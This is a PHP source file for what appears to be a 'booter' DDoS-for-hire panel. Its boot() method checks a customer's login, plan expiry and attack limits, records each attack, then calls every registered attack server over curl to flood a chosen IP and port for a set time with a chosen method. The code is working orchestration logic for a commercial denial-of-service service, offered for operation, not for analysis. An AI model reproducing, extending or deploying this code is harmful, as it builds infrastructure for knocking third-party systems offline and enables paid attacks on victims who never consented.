<?php
/**
 * User: Rogier
 * Date: 2-3-13
 * Time: 20:13
 *
 */
class Booter
{
    private static $_singleton;

    private function __construct(){}

    public static function getInstance()
    {
        if(!self::$_singleton)
        {
            self::$_singleton = new Booter();
        }
        return self::$_singleton;
    }

    public function boot($host, $time, $port, $method)
    {
        set_time_limit(800);

        if(!Auth::check()) return View::make('msg.errormn')->with('error', 'You are not logged in.');
        if(Booter::status() == false) return View::make('msg.errormn')->with('error', 'The booter is currently offline, try again later.');
        if(Server::count() == 0) return View::make('msg.errormn')->with('error', 'There are no servers to boot with.');
        if(Auth::user()->hasPlanExpired()) return View::make('msg.errormn')->with('error', 'Your plan has expired.');



        if(empty($host) || !filter_var($host, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4)) return View::make('msg.errormn')->with('error', 'Invalid target IP address.');
        if(Blacklist::where('ip', '=', $host)->count() > 0 || $host == $_SERVER['SERVER_ADDR'] || $host == gethostbyname( gethostname()) || Custblacklist::where('type', '=', 'ip')->where('blacklist', '=', $host)->count() > 0) return View::make('msg.errormn')->with('error', 'This host is blocked from being attacked.');
        if(empty($time) || !is_numeric($time)) return View::make('msg.errormn')->with('error', 'Invalid time.');
        if(empty($port) || !is_numeric($port)) return View::make('msg.errormn')->with('error', 'Invalid port.');
        if($time > Auth::user()->time) return View::make('msg.errormn')->with('error', 'Your max boot time is '. Auth::user()->time . ' seconds.');
        if($time < 1) return View::make('msg.errormn')->with('error', 'Boot for at least 1 second.');

        if($method != 'stop')
        {
        if(!Auth::user()->concurrentCheck()) return View::make('msg.errormn')->with('error', 'You already have '.Auth::user()->concurrent . ' attacks running, you can start your next attack in '.Auth::user()->secondsToAttackFinish(). ' seconds.');
        }
        //Get all methods
        $settings = parse_ini_file('application/config/config.ini');
        $m = $settings['methods'];
        $m = explode(',', $m);
        for($i=0; $i<count($m); $i++)
        {
            $methods[$i] = $m[$i];
        }
        $methods['stop'] = 'stop';
        if(empty($methods[$method])) return View::make('msg.errormn')->with('error', 'Invalid method.');

        if($method != 'stop')
        {
            Attack::create(array(
                'user_id' => Auth::user()->id,
                'user_ip' => $_SERVER['REMOTE_ADDR'],
                'ip' => $host,
                'time' => $time,
                'port' => $port,
                'method' => strtolower($methods[$method])
            ));
        }



        $mh = curl_multi_init();
        $ch3 = array();
        $cnt = Server::count();
        $servers = Server::all();

        for($i = 0; $i < $cnt; $i++)
        {
            $server = $servers[$i];
            $url = $server->url.'?'.$server->host.'='.$host.'&'.$server->time.'='.$time.'&'.$server->port.'='.$port.'&'. $server->method . '=' . strtolower($methods[$method]) . '&' . $server->custom;
            $ch3[$i] = curl_init($url);
            curl_setopt($ch3[$i], CURLOPT_RETURNTRANSFER, 1);
            curl_multi_add_handle($mh, $ch3[$i]);
        }

        $running = NULL;
        do
        {
        $mrc = curl_multi_exec($mh, $running);
        } while($running > 0);





        return true;
    }



    public static function status()
    {
        $s = IniHandle::readini();
        if($s['booterstatus'] == true) return true;
        return false;
    }

}

